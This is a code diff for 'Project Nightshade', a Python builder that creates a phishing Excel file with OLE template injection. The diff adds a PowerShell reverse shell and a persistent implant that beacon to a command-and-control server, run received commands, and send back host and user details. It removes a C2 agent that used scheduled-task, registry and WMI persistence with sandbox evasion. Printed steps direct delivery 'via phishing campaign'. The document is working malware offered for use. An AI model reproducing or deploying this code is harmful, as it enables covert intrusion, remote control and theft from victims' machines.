@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-Project Nightshade - Advanced Excel Dropper with Multiple Payload Options
+Project Nightshade - Advanced Excel Dropper with Enhanced C2 Integration
 Author: ek0ms savi0r | OPSEC Grade: Midnight
 Description:
     Creates an Excel file with OLE template injection that deploys multiple payload options:
-    - Reverse Shell (Immediate access)
-    - RCE + Persistence (Remote Code Execution) 
-    - Full C2 Agent (Advanced persistence + stealth)
+    - Reverse Shell (Connects to Nightshade C2)
+    - RCE + Persistence (Uses Nightshade C2 endpoints)
+    - Full C2 Agent (Advanced C2 with Nightshade protocol)
     Interactive version with payload selection menu.
 """
 import os
@@ -41,9 +41,9 @@ def prompt_user():
         output_file = 'Financial_Report_Q3.xlsx'
     
     print("\n[?] Select payload type:")
-    print("    1. Reverse Shell (Immediate access)")
-    print("    2. RCE + Persistence (Remote Code Execution)")
-    print("    3. Full C2 Agent (Advanced persistence + stealth)")
+    print("    1. Reverse Shell (Connects to Nightshade C2)")
+    print("    2. RCE + Persistence (Uses Nightshade C2 endpoints)") 
+    print("    3. Full C2 Agent (Advanced Nightshade protocol)")
     
     payload_choice = input("[?] Enter choice [2]: ").strip()
     if not payload_choice:
@@ -54,23 +54,28 @@ def prompt_user():
     
     if payload_choice == '1':
         payload_type = "reverse_shell"
-        print("\n[+] Selected: Reverse Shell")
-        additional_config['lhost'] = input("[?] Listener IP [127.0.0.1]: ").strip() or "127.0.0.1"
-        additional_config['lport'] = input("[?] Listener Port [4444]: ").strip() or "4444"
+        print("\n[+] Selected: Reverse Shell (Nightshade C2)")
+        print("[?] Nightshade C2 Server Configuration:")
+        c2_host = input("[?] C2 Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
+        c2_port = input("[?] C2 Reverse Shell Port [4444]: ").strip() or "4444"
+        additional_config['lhost'] = c2_host
+        additional_config['lport'] = c2_port
         
     elif payload_choice == '2':
         payload_type = "rce_persistence"
-        print("\n[+] Selected: RCE + Persistence")
-        additional_config['c2_server'] = input("[?] C2 Server URL [https://example.com/command]: ").strip()
-        if not additional_config['c2_server']:
-            additional_config['c2_server'] = base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21mYW5k').decode('utf-8')
+        print("\n[+] Selected: RCE + Persistence (Nightshade C2)")
+        print("[?] Nightshade C2 Server Configuration:")
+        c2_host = input("[?] C2 Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
+        c2_port = input("[?] C2 HTTP Port [8080]: ").strip() or "8080"
+        additional_config['c2_server'] = f"http://{c2_host}:{c2_port}"
         
     elif payload_choice == '3':
         payload_type = "full_c2"
-        print("\n[+] Selected: Full C2 Agent")
-        additional_config['c2_server'] = input("[?] C2 Server URL [https://example.com/command]: ").strip()
-        if not additional_config['c2_server']:
-            additional_config['c2_server'] = base64.b64decode('aHR0cHM6Ly9leGFtcGxlLmNvbS9jb21mYW5k').decode('utf-8')
+        print("\n[+] Selected: Full C2 Agent (Nightshade)")
+        print("[?] Nightshade C2 Server Configuration:")
+        c2_host = input("[?] C2 Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
+        c2_port = input("[?] C2 HTTP Port [8080]: ").strip() or "8080"
+        additional_config['c2_server'] = f"http://{c2_host}:{c2_port}"
     
     encryption_key = input("[?] Encryption key [nightshade-midnight-love-2023]: ").strip()
     if not encryption_key:
@@ -201,18 +206,33 @@ def encrypt_payload(payload, key):
     return base64.b64encode(cipher.iv + ct_bytes).decode()
 
 def create_reverse_shell_payload(lhost, lport):
-    """Create PowerShell reverse shell payload"""
+    """Create PowerShell reverse shell payload that connects to Nightshade C2"""
     rev_shell = f'''
-# Reverse Shell Payload
+# Reverse Shell to Nightshade C2
 $client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{{0}}
 
+# Send beacon to identify as Nightshade implant
+$beacon = [System.Text.Encoding]::ASCII.GetBytes("NIGHTSHADE_IMPLANT_CONNECTED`n")
+$stream.Write($beacon, 0, $beacon.Length)
+$stream.Flush()
+
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 {{
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    
+    # Handle special C2 commands
+    if ($data.Trim() -eq "NIGHTSHADE_GET_SESSION") {{
+        $sessionInfo = "SESSION:$env:COMPUTERNAME:$env:USERNAME"
+        $sendbyte = ([text.encoding]::ASCII).GetBytes($sessionInfo)
+        $stream.Write($sendbyte,0,$sendbyte.Length)
+        $stream.Flush()
+        continue
+    }}
+    
     $sendback = (iex $data 2>&1 | Out-String )
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+    $sendback2 = $sendback + "NIGHTSHADE> "
     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
     $stream.Write($sendbyte,0,$sendbyte.Length)
     $stream.Flush()
@@ -251,58 +271,83 @@ try {{
     return persistent_rev_shell
 
 def create_rce_persistence_payload(c2_server):
-    """Create RCE with persistence payload"""
+    """Create RCE with persistence payload using Nightshade C2 endpoints"""
     rce_payload = f'''
 $key = [System.Text.Encoding]::UTF8.GetBytes('{CONFIG['encryption_key']}')
 $iv = [System.Text.Encoding]::UTF8.GetBytes('initialvector12345')
 
 function Encrypt-Data($data) {{
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aes.Key = $key
-    $aes.IV = $iv
-    $encryptor = $aes.CreateEncryptor()
-    $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
-    [System.Convert]::ToBase64String($encrypted)
+    try {{
+        $aes = New-Object System.Security.Cryptography.AesManaged
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key = $key
+        $aes.IV = $iv
+        $encryptor = $aes.CreateEncryptor()
+        $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
+        return [System.Convert]::ToBase64String($encrypted)
+    }} catch {{
+        return $null
+    }}
 }}
 
 function Decrypt-Data($encryptedData) {{
-    $bytes = [System.Convert]::FromBase64String($encryptedData)
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aes.Key = $key
-    $aes.IV = $iv
-    $decryptor = $aes.CreateDecryptor()
-    $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
-    [System.Text.Encoding]::UTF8.GetString($decrypted)
+    try {{
+        $bytes = [System.Convert]::FromBase64String($encryptedData)
+        $aes = New-Object System.Security.Cryptography.AesManaged
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key = $key
+        $aes.IV = $iv
+        $decryptor = $aes.CreateDecryptor()
+        $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+        return [System.Text.Encoding]::UTF8.GetString($decrypted)
+    }} catch {{
+        return "noop"
+    }}
 }}
 
 function Establish-RCE {{
     $sessionId = [System.Guid]::NewGuid().ToString()
+    
     while ($true) {{
         try {{
-            $response = Invoke-WebRequest -Uri "{c2_server}" -Method POST -Headers @{{
+            # Check in with Nightshade C2 server
+            $encryptedCheckin = Encrypt-Data "checkin_$([datetime]::Now.Ticks)"
+            $response = Invoke-WebRequest -Uri "{c2_server}/c2/checkin" -Method POST -Headers @{{
                 "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                 "X-Session-ID" = $sessionId
-            }} -Body (Encrypt-Data "checkin") -UseBasicParsing
+            }} -Body $encryptedCheckin -UseBasicParsing
             
             $command = Decrypt-Data $response.Content
             if ($command -ne "noop") {{
                 # Execute command and send back results
-                $result = Invoke-Expression $command 2>&1 | Out-String
-                $encryptedResult = Encrypt-Data $result
+                try {{
+                    $result = Invoke-Expression $command 2>&1 | Out-String
+                    $status = "success"
+                }} catch {{
+                    $result = $_.Exception.Message
+                    $status = "error"
+                }}
                 
-                Invoke-WebRequest -Uri "{c2_server}" -Method POST -Headers @{{
+                # Send results back to Nightshade C2
+                $responseData = @{{
+                    status = $status
+                    result = $result
+                    hostname = $env:COMPUTERNAME
+                    username = $env:USERNAME
+                }} | ConvertTo-Json -Compress
+                
+                $encryptedResult = Encrypt-Data $responseData
+                Invoke-WebRequest -Uri "{c2_server}/c2/result" -Method POST -Headers @{{
                     "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                     "X-Session-ID" = $sessionId
-                }} -Body $encryptedResult -UseBasicParsing
+                }} -Body $encryptedResult -UseBasicParsing | Out-Null
             }}
         }} catch {{
             # Silent error handling
         }}
-        Start-Sleep -Seconds 60  # Check every minute for commands
+        Start-Sleep -Seconds 60
     }}
 }}
 
@@ -326,150 +371,6 @@ Establish-RCE
 '''
     return rce_payload
 
-def create_full_c2_payload(c2_server):
-    """Create full C2 agent with advanced capabilities"""
-    full_c2 = f'''
-# Advanced C2 Agent with multiple persistence and stealth capabilities
-$key = [System.Text.Encoding]::UTF8.GetBytes('{CONFIG['encryption_key']}')
-$iv = [System.Text.Encoding]::UTF8.GetBytes('initialvector12345')
-
-function Encrypt-Data($data) {{
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aes.Key = $key
-    $aes.IV = $iv
-    $encryptor = $aes.CreateEncryptor()
-    $encrypted = $encryptor.TransformFinalBlock([System.Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
-    [System.Convert]::ToBase64String($encrypted)
-}}
-
-function Decrypt-Data($encryptedData) {{
-    $bytes = [System.Convert]::FromBase64String($encryptedData)
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aes.Key = $key
-    $aes.IV = $iv
-    $decryptor = $aes.CreateDecryptor()
-    $decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
-    [System.Text.Encoding]::UTF8.GetString($decrypted)
-}}
-
-function Establish-C2 {{
-    $sessionId = [System.Guid]::NewGuid().ToString()
-    $checkinCount = 0
-    
-    while ($true) {{
-        try {{
-            # Vary check-in interval for stealth
-            $interval = if ($checkinCount % 10 -eq 0) {{ 300 }} else {{ 60 }}  # 5 min every 10th, else 1 min
-            $checkinCount++
-            
-            $response = Invoke-WebRequest -Uri "{c2_server}" -Method POST -Headers @{{
-                "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                "X-Session-ID" = $sessionId
-                "X-Checkin-Count" = $checkinCount
-            }} -Body (Encrypt-Data "checkin_$checkinCount") -UseBasicParsing
-            
-            $command = Decrypt-Data $response.Content
-            if ($command -ne "noop") {{
-                # Execute command with error handling
-                try {{
-                    $result = Invoke-Expression $command 2>&1 | Out-String
-                    $status = "success"
-                }} catch {{
-                    $result = $_.Exception.Message
-                    $status = "error"
-                }}
-                
-                $responseData = @{{
-                    status = $status
-                    result = $result
-                    hostname = $env:COMPUTERNAME
-                    username = $env:USERNAME
-                    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-                }} | ConvertTo-Json
-                
-                $encryptedResult = Encrypt-Data $responseData
-                
-                Invoke-WebRequest -Uri "{c2_server}" -Method POST -Headers @{{
-                    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                    "X-Session-ID" = $sessionId
-                }} -Body $encryptedResult -UseBasicParsing
-            }}
-        }} catch {{
-            # Silent error handling with exponential backoff
-            $sleepTime = [math]::Min(300, [math]::Pow(2, $checkinCount % 6))
-            Start-Sleep -Seconds $sleepTime
-        }}
-        Start-Sleep -Seconds $interval
-    }}
-}}
-
-function Setup-Advanced-Persistence {{
-    # Multiple persistence mechanisms
-    $persistencePath = "$env:APPDATA\\Microsoft\\Windows\\Themes\\theme.ps1"
-    
-    # Ensure directory exists
-    if (-not (Test-Path (Split-Path $persistencePath))) {{
-        New-Item -ItemType Directory -Path (Split-Path $persistencePath) -Force
-    }}
-    
-    # Save current script for persistence
-    $currentScript = Get-Content -Path $PSCommandPath | Select-Object -Skip 1
-    Set-Content -Path $persistencePath -Value $currentScript
-    
-    # 1. Scheduled Task
-    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistencePath`""
-    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
-    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
-    $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-    Register-ScheduledTask -TaskName "ThemeService" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force
-    
-    # 2. Registry Run
-    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-    Set-ItemProperty -Path $regPath -Name "ThemeService" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistencePath`"" -Force
-    
-    # 3. WMI Event Subscription (Advanced)
-    try {{
-        $filterArgs = @{{Name="ThemeFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"}}
-        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
-        
-        $consumerArgs = @{{Name="ThemeConsumer"; CommandLineTemplate="powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistencePath`""}}
-        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
-        
-        $bindingArgs = @{{Filter=$filter; Consumer=$consumer}}
-        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
-    }} catch {{}}
-}}
-
-# Anti-analysis checks
-function Check-Environment {{
-    # Check for sandbox/virtual environment
-    $isVM = $false
-    $blacklistedProcesses = @("vmtoolsd", "vboxservice", "procmon", "wireshark", "ProcessHacker")
-    
-    foreach ($proc in $blacklistedProcesses) {{
-        if (Get-Process $proc -ErrorAction SilentlyContinue) {{
-            $isVM = $true
-            break
-        }}
-    }}
-    
-    # Check for debugging
-    $isDebugger = [System.Diagnostics.Debugger]::IsAttached
-    
-    return (-not $isVM -and -not $isDebugger)
-}}
-
-# Main execution
-if (Check-Environment) {{
-    Setup-Advanced-Persistence
-    Establish-C2
-}}
-'''
-    return full_c2
 def create_embedded_macro():
     """Create heavily obfuscated VBA macro"""
     vba_code = f'''
@@ -674,9 +575,12 @@ def create_malicious_excel(output_file, use_ngrok, custom_domain=None, payload_t
         print(f"[+] Encryption key: {CONFIG['encryption_key']}")
         
         if payload_type == "reverse_shell":
-            print(f"[+] Reverse Shell: {payload_config['lhost']}:{payload_config['lport']}")
+            print(f"[+] Reverse Shell Target: {payload_config['lhost']}:{payload_config['lport']}")
+            print(f"[+] Connect to Nightshade C2 on port {payload_config['lport']}")
         else:
             print(f"[+] C2 Server: {payload_config['c2_server']}")
+            print(f"[+] C2 Checkin: {payload_config['c2_server']}/c2/checkin")
+            print(f"[+] C2 Results: {payload_config['c2_server']}/c2/result")
         
         print(f"[+] Template Source: {template_source}")
         print(f"[+] Template URL: {template_url}")
@@ -715,26 +619,27 @@ def main():
         )
         
         print("\n[+] Delivery Instructions:")
-        print("    1. Deliver the Excel file via phishing campaign")
-        print("    2. When opened, it will attempt to load remote template")
-        print("    3. Staging server validates User-Agent (Excel only)")
+        print("    1. Start the Nightshade C2 server first")
+        print("    2. Deliver the Excel file via phishing campaign")
+        print("    3. When opened, it loads the remote template")
         print("    4. Template executes encrypted in-memory payload")
         
         if user_config['payload_type'] == "reverse_shell":
-            print("    5. Reverse shell connects back to your listener")
-            print(f"    6. Start netcat listener: nc -lvnp {user_config.get('lport', 4444)}")
+            print("    5. Reverse shell connects to Nightshade C2")
+            print(f"    6. C2 handles shell on port {user_config.get('lport', 4444)}")
         else:
-            print("    5. Payload establishes persistence and C2 connection")
-            print("    6. Commands are executed entirely in memory")
+            print("    5. Implant checks in to Nightshade C2 every 60 seconds")
+            print("    6. Send commands via: POST /c2/command")
+            print("    7. View results in C2 dashboard: /c2/sessions")
         
         if user_config['use_ngrok']:
-            print("    7. Using ngrok tunneling for infrastructure-less deployment")
+            print("    8. Using ngrok tunneling for infrastructure-less deployment")
         elif user_config['custom_domain']:
-            print(f"    7. Using custom domain: {user_config['custom_domain']}")
+            print(f"    8. Using custom domain: {user_config['custom_domain']}")
         else:
-            print("    7. Using domain rotation for OPSEC")
+            print("    8. Using domain rotation for OPSEC")
             
-        print("\n[!] Remember to start the staging server before deployment!")
+        print("\n[!] Remember to start the Nightshade C2 server before deployment!")
         
     except Exception as e:
         print(f"[-] Error: {e}")
